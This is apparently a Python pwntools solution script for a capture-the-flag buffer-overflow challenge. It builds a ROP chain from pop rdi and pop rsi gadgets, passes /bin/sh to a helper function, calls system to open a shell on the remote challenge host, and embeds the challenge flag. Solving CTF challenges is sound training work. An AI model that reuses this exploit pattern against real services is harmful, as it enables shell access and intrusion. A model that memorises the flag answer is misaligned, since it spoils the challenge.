#!/usr/bin/env python3
#SCTF{S0_w3_c4ll_it_ROP_cha1n}
#python3 solution.py

from pwn import *

target_address_1 = 0x00000000004007b3 #pop rdi ; ret
target_address_2 = 0x0000000000400747 #pop rsi ; ret
target_address_3 = 0x0000000000400529 #ret

p = remote("bof103.sstf.site", 1337, ssl=False)
#p = process("./bof103")
#raw_input("attach gdb")

p.recvuntil("Name >")

#pad = cyclic(512, n=8)
pad = b'A' * cyclic_find("daaaaaaa", n=8)

useme_func_addr = 0x4006a6
rdi = 0x0068732f6e69622f #/bin/sh ie. useme's first argument
rsi = 1 #useme's second argument
key_var_addr_in_data_section = 0x601068
system_call_addr_taken_from_main = 0x40072d

payload = pad + p64(target_address_3) + p64(target_address_1) + p64(rdi) + p64(target_address_2) + p64(rsi) + p64(useme_func_addr) + p64(target_address_1) + p64(key_var_addr_in_data_section) + p64(system_call_addr_taken_from_main) 

print(payload)
p.sendline(payload)

p.interactive()
